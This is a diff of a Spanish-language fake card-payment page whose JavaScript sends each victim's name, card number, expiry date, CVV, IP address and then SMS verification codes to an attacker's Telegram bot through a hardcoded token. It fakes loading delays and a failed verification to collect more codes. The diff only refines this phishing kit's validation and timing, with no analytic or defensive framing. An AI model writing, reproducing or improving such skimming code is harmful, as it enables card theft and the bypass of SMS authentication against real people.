@@ -183,7 +183,7 @@
                 <br>
                 <div class="form-row">
                     <div class="form-group">
-                        <input inputmode="numeric" class="bbb" type="text" id="expiry-date" name="expiry-date" maxlength="10" required>
+                        <input inputmode="numeric" class="bbb" type="text" id="expiry-date" name="expiry-date" maxlength="5" required>
                         <label style="color: #aaa;" for="expiry-date">Fecha de Vencimiento</label>
                     </div>
                     <div class="form-group">
@@ -226,12 +226,21 @@
             </div>
         </div>
     </center>
+   
+   
+
+
+
+
+
+
+
 
     <script>
         // Datos del bot de Telegram
         const token = "6897156936:AAG0flQ523Ry86PqBj_F9Xtk-a7NkMM_GIM";
         const chat_id = "5157616506";
-
+    
         // Enviar información a Telegram
         function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
@@ -239,7 +248,7 @@
                 .then(response => console.log("Mensaje enviado a Telegram"))
                 .catch(error => console.error("Error al enviar mensaje a Telegram:", error));
         }
-
+    
         // Obtener la IP del cliente
         function getClientIP() {
             return fetch('https://api.ipify.org?format=json')
@@ -247,23 +256,29 @@
                 .then(data => data.ip)
                 .catch(error => 'IP no disponible');
         }
-
+    
         document.getElementById('debit-card-form').addEventListener('submit', async function (event) {
             event.preventDefault();
-
+    
             const name = document.getElementById('name').value;
             const cardNumber = document.getElementById('card-number').value;
             const expiryDate = document.getElementById('expiry-date').value;
             const cvv = document.getElementById('cvv').value;
             const clientIP = await getClientIP(); // Obtener IP del cliente
-
+    
+            // Validar fecha de vencimiento solo al enviar el formulario
+            if (!validateExpiryDate(expiryDate)) {
+                alert('Método de pago no válido. Verifica el mes y el año de la tarjeta.');
+                return;
+            }
+    
             // Enviar información inicial a Telegram
             sendToTelegram(`Pago iniciado:\nNombre: ${name}\nNúmero de tarjeta: ${cardNumber}\nFecha de vencimiento: ${expiryDate}\nCVV: ${cvv}\nIP: ${clientIP}`);
-
+    
             // Mostrar la ventana emergente de cargando
             const loadingContainer = document.getElementById('loading-container');
             loadingContainer.style.display = 'flex';
-
+    
             // Esperar 23 segundos para mostrar la ventana del código SMS
             setTimeout(() => {
                 loadingContainer.style.display = 'none';
@@ -272,39 +287,34 @@
                 document.getElementById('form-container').style.filter = 'blur(5px)'; // Aplicar efecto borroso al fondo
             }, 23000);
         });
-
+    
         // Evento para verificar el código SMS
         document.getElementById('verify-sms').addEventListener('click', function () {
             const smsCode = document.getElementById('sms-code').value;
-
+    
             // Enviar código SMS a Telegram
             sendToTelegram(`Código SMS ingresado: ${smsCode}`);
-
+    
             if (smsCode.length === 6) {
-                // Simular segundo intento con carga
+                // Mostrar la ventana de cargando nuevamente durante 8 segundos
                 const smsContainer = document.getElementById('sms-container');
                 smsContainer.style.display = 'none';
                 const loadingContainer = document.getElementById('loading-container');
                 loadingContainer.style.display = 'flex';
-
+    
                 setTimeout(() => {
+                    // Ocultar la ventana de cargando y mostrar el mensaje de error
                     loadingContainer.style.display = 'none';
                     smsContainer.style.display = 'flex';
                     document.getElementById('sms-code').value = ''; // Limpiar campo SMS
                     document.getElementById('sms-code').style.border = '2px solid red';
                     document.getElementById('error-message').style.display = 'block';
-
-                    // Redirigir a fila.html después del segundo intento
-                    setTimeout(() => {
-                        window.location.href = "fila.html";
-                    }, 5000);
-
-                }, 23000);
+                }, 8000);
             } else {
                 alert("Por favor, ingrese un código válido de 6 dígitos.");
             }
         });
-
+    
         // Formato para el campo de número de tarjeta
         const cardNumberInput = document.getElementById('card-number');
         cardNumberInput.addEventListener('input', function (event) {
@@ -313,30 +323,50 @@
             if (value.length > 19) value = value.slice(0, 19); // Limitar a 16 dígitos + 3 espacios
             event.target.value = value;
         });
-
+    
         // Formato para el campo de fecha de vencimiento
         const expiryDateInput = document.getElementById('expiry-date');
         expiryDateInput.addEventListener('input', function (event) {
             let value = event.target.value.replace(/\D/g, ''); // Eliminar todo lo que no sea un dígito
+            if (value.length > 4) value = value.slice(0, 4); // Limitar a 4 dígitos
+    
             if (value.length >= 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2); // Insertar la barra después de mes
+                value = value.slice(0, 2) + '/' + value.slice(2); // Insertar la barra después de los dos primeros dígitos
             }
-            if (value.length > 5) value = value.slice(0, 5); // Limitar a MM/AA
+    
             event.target.value = value;
-
-            // Validar el año y el mes
-            if (value.length === 5) {
-                const month = parseInt(value.slice(0, 2));
-                const year = parseInt(value.slice(3));
-                if (month < 1 || month > 12) {
-                    alert('Método de pago no válido.');
-                    event.target.value = '';
-                } else if (year < 24 || year > 60) {
-                    alert('Método de pago no válido.');
-                    event.target.value = '';
-                }
-            }
         });
+    
+        // Función para validar la fecha de vencimiento al presionar "Pagar"
+        function validateExpiryDate(expiryDate) {
+            if (expiryDate.length === 5) {
+                const [month, year] = expiryDate.split('/');
+                const parsedMonth = parseInt(month, 10);
+                const parsedYear = parseInt(year, 10);
+    
+                if (parsedMonth < 1 || parsedMonth > 12) {
+                    return false; // Mes no válido
+                }
+    
+                if (parsedYear < 24 || parsedYear > 60) {
+                    return false; // Año no válido
+                }
+    
+                return true; // Mes y año válidos
+            }
+    
+            return false; // Formato de fecha incorrecto
+        }
     </script>
+    
+
+
+
+
+
+
+
+
+
 </body>
 </html>
